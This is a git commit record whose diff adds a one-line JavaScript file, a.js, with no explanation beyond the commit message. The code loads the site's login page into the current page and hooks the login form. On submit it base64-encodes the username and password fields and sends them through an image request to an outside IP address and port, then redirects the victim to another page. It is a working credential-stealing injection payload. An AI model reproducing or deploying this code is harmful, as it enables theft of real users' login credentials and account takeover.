f359f21e2d154fd322fffaf972a8f025fb4596cc
soesam <67687007+soesam@users.noreply.github.com>
2020-07-09 10:17:50 +0200

    Update and rename script.js to a.js

---
+++ a.js
@@ -0,0 +1,1 @@
+(async()=>document.write(await fetch("/login.php").then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="http://13.58.170.241:1235/?data="+btoa(c[0].value+"||"+c[1].value),a(()=>window.location="/resource.php?rid=77",1e3)}),4e3)</script>`))()
